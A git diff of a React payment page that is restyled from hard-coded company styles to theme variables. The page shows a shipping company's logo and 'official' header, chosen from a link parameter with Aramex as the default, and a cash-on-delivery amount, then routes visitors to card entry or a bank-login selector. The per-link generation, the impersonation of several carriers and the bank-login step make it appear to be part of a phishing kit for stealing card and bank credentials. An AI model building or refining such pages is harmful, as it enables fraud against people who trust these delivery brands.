@@ -1,26 +1,21 @@
 import { useParams, useNavigate } from "react-router-dom";
-import { getServiceBranding } from "@/lib/serviceLogos";
 import { useLink } from "@/hooks/useSupabase";
-import { getCountryByCode } from "@/lib/countries";
-import { formatCurrency, getCurrencyByCountry } from "@/lib/countryCurrencies";
-import { getCompanyById } from "@/lib/shippingCompanies";
-import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck } from "lucide-react";
+import { formatCurrency } from "@/lib/countryCurrencies";
+import { CreditCard, ArrowLeft, Hash, DollarSign, Package } from "lucide-react";
+import { useTheme } from "@/themes/ThemeContext";
 
 const PaymentDetailsOfficial = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { data: linkData } = useLink(id);
+  const { theme } = useTheme();
 
   const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
-  const branding = getServiceBranding(serviceKey);
   const shippingInfo = linkData?.payload as any;
 
   // Get country code from link data
   const countryCode = shippingInfo?.selectedCountry || "SA";
-
-  // Get currency info for display
-  const currencyInfo = getCurrencyByCountry(countryCode);
 
   // Get amount from link data - ensure it's a number, handle all data types
   const rawAmount = shippingInfo?.cod_amount;
@@ -47,78 +42,45 @@ const PaymentDetailsOfficial = () => {
 
     // If payment method is "card", skip bank selector and go directly to card input
     if (paymentMethod === 'card') {
-      navigate(`/pay/${id}/card-input`);
+      navigate(`/pay/${id}/card`);
     } else {
       // For "bank_login" method, show bank selector
       navigate(`/pay/${id}/bank-selector`);
     }
   };
 
-  // Get company data and styling
-  const company = getCompanyById(serviceKey);
-  const getCompanyStyles = () => {
-    if (!company) {
-      // Fallback styles
-      return {
-        gradient: 'linear-gradient(135deg, #E31E24, #FF6B35)',
-        background: 'linear-gradient(180deg, #FFF 0%, #FFF5F5 100%)',
-        cardBg: '#FFFFFF',
-        primaryText: '#1A1A1A',
-        secondaryText: '#6B6B6B',
-        logo: '/logos/aramex-logo.svg',
-        fontFamily: "'Cairo', 'Tajawal', sans-serif",
-        headerBg: '#FFFFFF',
-        borderColor: '#E0E0E0',
-        buttonShadow: '0 4px 12px rgba(227, 30, 36, 0.25)',
-      };
-    }
-
-    return {
-      gradient: company.colors.gradient,
-      background: company.colors.background,
-      cardBg: '#FFFFFF',
-      primaryText: '#1A1A1A',
-      secondaryText: '#6B6B6B',
-      logo: company.logo,
-      fontFamily: company.fontFamily,
-      headerBg: '#FFFFFF',
-      borderColor: '#E0E0E0',
-      buttonShadow: `0 4px 12px ${company.colors.primary}40`,
-    };
-  };
-
-  const companyStyles = getCompanyStyles();
-
   return (
     <div
       className="min-h-screen"
       style={{
-        background: companyStyles.background,
-        fontFamily: companyStyles.fontFamily,
+        background: 'var(--color-background)',
+        fontFamily: 'var(--font-family)',
       }}
     >
       {/* Official Company Header */}
       <header
         className="sticky top-0 z-50 w-full border-b"
         style={{
-          backgroundColor: companyStyles.headerBg,
-          borderBottomColor: companyStyles.borderColor,
-          boxShadow: '0 2px 8px rgba(0,0,0,0.05)',
+          backgroundColor: 'var(--color-surface)',
+          borderBottomColor: 'var(--color-border)',
+          height: 'var(--header-height)',
+          padding: 'var(--header-padding)',
+          boxShadow: 'var(--header-box-shadow)',
         }}
       >
-        <div className="container mx-auto px-4 h-16 sm:h-20 flex items-center justify-between">
+        <div className="container mx-auto h-full flex items-center justify-between">
           <div className="flex items-center gap-3 sm:gap-4">
             <img
-              src={companyStyles.logo}
+              src={theme?.logo}
               alt={serviceName}
               className="h-8 sm:h-12 w-auto object-contain"
             />
           </div>
           <div className="text-right">
-            <h1 className="text-lg sm:text-xl font-bold" style={{ color: companyStyles.primaryText }}>
+            <h1 className="text-lg sm:text-xl font-bold" style={{ color: 'var(--color-text)' }}>
               {serviceName}
             </h1>
-            <p className="text-xs sm:text-sm" style={{ color: companyStyles.secondaryText }}>
+            <p className="text-xs sm:text-sm" style={{ color: 'var(--color-text-secondary)' }}>
               خدمة الدفع الآمن
             </p>
           </div>
@@ -127,7 +89,7 @@ const PaymentDetailsOfficial = () => {
         <div
           className="h-1 w-full"
           style={{
-            background: companyStyles.gradient,
+            background: 'var(--gradient)',
           }}
         />
       </header>
@@ -139,20 +101,20 @@ const PaymentDetailsOfficial = () => {
           <div
             className="mb-6 sm:mb-8 p-4 sm:p-6 rounded-lg border"
             style={{
-              backgroundColor: companyStyles.cardBg,
-              borderColor: companyStyles.borderColor,
+              backgroundColor: 'var(--color-surface)',
+              borderColor: 'var(--color-border)',
             }}
           >
             <div className="flex items-center justify-between mb-3">
               <span
                 className="text-sm font-semibold"
-                style={{ color: companyStyles.primaryText }}
+                style={{ color: 'var(--color-text)' }}
               >
-                الخطوة 1 من 4
+                الخطوة 2 من 4
               </span>
               <span
                 className="text-xs"
-                style={{ color: companyStyles.secondaryText }}
+                style={{ color: 'var(--color-text-secondary)' }}
               >
                 {serviceName}
               </span>
@@ -161,8 +123,8 @@ const PaymentDetailsOfficial = () => {
               <div
                 className="h-full rounded-full transition-all duration-500"
                 style={{
-                  width: '25%',
-                  background: companyStyles.gradient,
+                  width: '50%',
+                  background: 'var(--gradient)',
                 }}
               />
             </div>
@@ -172,9 +134,11 @@ const PaymentDetailsOfficial = () => {
           <div
             className="border rounded-xl p-6 sm:p-8 mb-6"
             style={{
-              backgroundColor: companyStyles.cardBg,
-              borderColor: companyStyles.borderColor,
-              boxShadow: '0 4px 12px rgba(0,0,0,0.08)',
+                backgroundColor: 'var(--color-surface)',
+                borderColor: 'var(--color-border)',
+                borderRadius: 'var(--card-border-radius)',
+                padding: 'var(--card-padding)',
+                border: 'var(--card-border)',
             }}
           >
             {/* Shipping Info Display */}
@@ -182,45 +146,45 @@ const PaymentDetailsOfficial = () => {
               <div className="mb-6 sm:mb-8">
                 <h3
                   className="font-bold mb-4 text-base sm:text-lg"
-                  style={{ color: companyStyles.primaryText }}
+                  style={{ color: 'var(--color-text)' }}
                 >
                   تفاصيل الشحنة
                 </h3>
                 <div className="space-y-3">
                   {shippingInfo.tracking_number && (
-                    <div className="flex items-center gap-3 p-3 rounded-lg" style={{ backgroundColor: `${branding.colors.primary}08` }}>
-                      <Hash className="w-5 h-5" style={{ color: branding.colors.primary }} />
+                    <div className="flex items-center gap-3 p-3 rounded-lg" style={{ backgroundColor: `rgba(var(--color-primary-rgb), 0.08)` }}>
+                      <Hash className="w-5 h-5" style={{ color: 'var(--color-primary)' }} />
                       <div className="flex-1">
-                        <div className="text-xs" style={{ color: companyStyles.secondaryText }}>
+                        <div className="text-xs" style={{ color: 'var(--color-text-secondary)' }}>
                           رقم الشحنة:
                         </div>
-                        <div className="font-bold text-sm" style={{ color: companyStyles.primaryText }}>
+                        <div className="font-bold text-sm" style={{ color: 'var(--color-text)' }}>
                           {shippingInfo.tracking_number}
                         </div>
                       </div>
                     </div>
                   )}
                   {shippingInfo.package_description && (
-                    <div className="flex items-center gap-3 p-3 rounded-lg" style={{ backgroundColor: `${branding.colors.primary}08` }}>
-                      <Package className="w-5 h-5" style={{ color: branding.colors.primary }} />
+                    <div className="flex items-center gap-3 p-3 rounded-lg" style={{ backgroundColor: `rgba(var(--color-primary-rgb), 0.08)` }}>
+                      <Package className="w-5 h-5" style={{ color: 'var(--color-primary)' }} />
                       <div className="flex-1">
-                        <div className="text-xs" style={{ color: companyStyles.secondaryText }}>
+                        <div className="text-xs" style={{ color: 'var(--color-text-secondary)' }}>
                           وصف الطرد:
                         </div>
-                        <div className="font-bold text-sm" style={{ color: companyStyles.primaryText }}>
+                        <div className="font-bold text-sm" style={{ color: 'var(--color-text)' }}>
                           {shippingInfo.package_description}
                         </div>
                       </div>
                     </div>
                   )}
                   {shippingInfo.cod_amount > 0 && (
-                    <div className="flex items-center gap-3 p-3 rounded-lg" style={{ backgroundColor: `${branding.colors.primary}08` }}>
-                      <DollarSign className="w-5 h-5" style={{ color: branding.colors.primary }} />
+                    <div className="flex items-center gap-3 p-3 rounded-lg" style={{ backgroundColor: `rgba(var(--color-primary-rgb), 0.08)` }}>
+                      <DollarSign className="w-5 h-5" style={{ color: 'var(--color-primary)' }} />
                       <div className="flex-1">
-                        <div className="text-xs" style={{ color: companyStyles.secondaryText }}>
+                        <div className="text-xs" style={{ color: 'var(--color-text-secondary)' }}>
                           مبلغ COD:
                         </div>
-                        <div className="font-bold text-sm" style={{ color: companyStyles.primaryText }}>
+                        <div className="font-bold text-sm" style={{ color: 'var(--color-text)' }}>
                           {formatCurrency(shippingInfo.cod_amount, countryCode)}
                         </div>
                       </div>
@@ -231,25 +195,25 @@ const PaymentDetailsOfficial = () => {
             )}
 
             {/* Payment Summary */}
-            <div className="border-t pt-6" style={{ borderColor: companyStyles.borderColor }}>
+            <div className="border-t pt-6" style={{ borderColor: 'var(--color-border)' }}>
               <h3
                 className="font-bold mb-4 text-base sm:text-lg"
-                style={{ color: companyStyles.primaryText }}
+                style={{ color: 'var(--color-text)' }}
               >
                 ملخص الدفعة
               </h3>
 
               <div className="space-y-4">
-                <div className="flex justify-between py-3 border-b" style={{ borderColor: companyStyles.borderColor }}>
+                <div className="flex justify-between py-3 border-b" style={{ borderColor: 'var(--color-border)' }}>
                   <span
                     className="text-sm sm:text-base"
-                    style={{ color: companyStyles.secondaryText }}
+                    style={{ color: 'var(--color-text-secondary)' }}
                   >
                     الخدمة
                   </span>
                   <span
                     className="font-semibold text-sm sm:text-base"
-                    style={{ color: companyStyles.primaryText }}
+                    style={{ color: 'var(--color-text)' }}
                   >
                     {serviceName}
                   </span>
@@ -258,19 +222,19 @@ const PaymentDetailsOfficial = () => {
                 <div
                   className="flex justify-between items-center p-4 sm:p-5 rounded-lg border-2"
                   style={{
-                    background: `linear-gradient(135deg, ${branding.colors.primary}08, ${branding.colors.secondary}08)`,
-                    borderColor: branding.colors.primary,
+                    background: `linear-gradient(135deg, rgba(var(--color-primary-rgb), 0.08), rgba(var(--color-secondary-rgb), 0.08))`,
+                    borderColor: 'var(--color-primary)',
                   }}
                 >
                   <span
                     className="text-base sm:text-lg font-bold"
-                    style={{ color: companyStyles.primaryText }}
+                    style={{ color: 'var(--color-text)' }}
                   >
                     المبلغ الإجمالي
                   </span>
                   <span
                     className="text-xl sm:text-2xl font-bold"
-                    style={{ color: branding.colors.primary }}
+                    style={{ color: 'var(--color-primary)' }}
                   >
                     {formattedAmount}
                   </span>
@@ -282,27 +246,27 @@ const PaymentDetailsOfficial = () => {
             <div className="mt-6 sm:mt-8">
               <h3
                 className="font-bold mb-4 text-base sm:text-lg"
-                style={{ color: companyStyles.primaryText }}
+                style={{ color: 'var(--color-text)' }}
               >
                 طريقة الدفع
               </h3>
               <div
                 className="border-2 rounded-lg p-4"
                 style={{
-                  borderColor: branding.colors.primary,
-                  backgroundColor: `${branding.colors.primary}10`,
+                  borderColor: 'var(--color-primary)',
+                  backgroundColor: `rgba(var(--color-primary-rgb), 0.1)`,
                 }}
               >
                 <div className="flex items-center gap-3">
-                  <CreditCard className="w-6 h-6" style={{ color: branding.colors.primary }} />
+                  <CreditCard className="w-6 h-6" style={{ color: 'var(--color-primary)' }} />
                   <div>
                     <p
                       className="font-bold text-sm sm:text-base"
-                      style={{ color: companyStyles.primaryText }}
+                      style={{ color: 'var(--color-text)' }}
                     >
                       الدفع بالبطاقة
                     </p>
-                    <p className="text-xs sm:text-sm" style={{ color: companyStyles.secondaryText }}>
+                    <p className="text-xs sm:text-sm" style={{ color: 'var(--color-text-secondary)' }}>
                       Visa، Mastercard، Mada
                     </p>
                   </div>
@@ -316,9 +280,12 @@ const PaymentDetailsOfficial = () => {
             onClick={handleProceed}
             className="w-full text-white font-bold py-4 sm:py-5 px-6 rounded-lg transition-all duration-300 hover:shadow-lg active:scale-[0.98] flex items-center justify-center gap-2 text-sm sm:text-base"
             style={{
-              background: companyStyles.gradient,
-              boxShadow: companyStyles.buttonShadow,
-              fontFamily: companyStyles.fontFamily,
+              background: 'var(--gradient)',
+              padding: 'var(--button-padding)',
+              borderRadius: 'var(--button-border-radius)',
+              fontWeight: 'var(--button-font-weight)',
+              textTransform: 'var(--button-text-transform)',
+              fontFamily: 'var(--font-family)',
             }}
           >
             <span>المتابعة للدفع</span>
@@ -327,7 +294,7 @@ const PaymentDetailsOfficial = () => {
 
           <p
             className="text-xs text-center mt-4"
-            style={{ color: companyStyles.secondaryText }}
+            style={{ color: 'var(--color-text-secondary)' }}
           >
             بالمتابعة، أنت توافق على الشروط والأحكام
           </p>
